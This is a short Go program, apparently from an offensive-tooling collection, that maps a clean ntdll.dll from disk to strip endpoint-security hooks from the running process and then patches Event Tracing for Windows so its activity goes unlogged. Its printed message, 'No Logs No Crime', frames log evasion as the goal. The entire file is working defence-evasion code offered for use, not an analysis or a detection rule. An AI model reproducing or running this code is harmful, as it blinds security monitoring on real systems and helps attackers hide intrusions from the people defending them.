package main

// code rewrited from https://github.com/AiGptCode/No-Logs-No-Crime-Fuck-Etw/blob/main/Fuck-ETW-Pyrhon.py

import (
	"fmt"

	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	"golang.org/x/sys/windows"
)

func main() {
	fmt.Println("[+] Hooked Ntdll Base Address:", windows.NewLazySystemDLL("ntdll.dll").Handle())

	hFile, err := windows.CreateFile(
		windows.StringToUTF16Ptr(evasion.NtdllPath),
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		fmt.Println("[!] Failed to open ntdll.dll:", err)
		return
	}
	defer windows.CloseHandle(hFile)

	hFileMapping, err := windows.CreateFileMapping(
		hFile,
		nil,
		windows.PAGE_READONLY|evasion.SEC_IMAGE,
		0,
		0,
		nil,
	)
	if err != nil {
		fmt.Println("[!] File mapping failed:", err)
		return
	}
	defer windows.CloseHandle(hFileMapping)

	pMapping, err := windows.MapViewOfFile(
		hFileMapping,
		windows.FILE_MAP_READ,
		0,
		0,
		0,
	)
	if err != nil {
		fmt.Println("[!] Mapping failed:", err)
		return
	}
	defer windows.UnmapViewOfFile(pMapping)

	ntdllHandle := windows.NewLazySystemDLL("ntdll.dll").Handle()
	err = evasion.UnhookNTDLL(windows.Handle(ntdllHandle), uintptr(pMapping))
	if err != nil {
		fmt.Printf("[!] Failed to unhook NTDLL: %v\n", err)
		return
	}

	fmt.Println("[+] Unhooked Ntdll Base Address:", ntdllHandle)
	fmt.Printf("[+] PID Of The Current Process: %d\n", windows.GetCurrentProcessId())
	fmt.Println("[+] Ready For ETW Patch.")
	fmt.Print("[+] Press <Enter> To Patch ETW ...")
	fmt.Scanln()

	err = evasion.FuckETW()
	if err != nil {
		fmt.Println("[!] Failed to patch ETW:", err)
		return
	}

	fmt.Println("[+] ETW Patched, No Logs No Crime!")
}
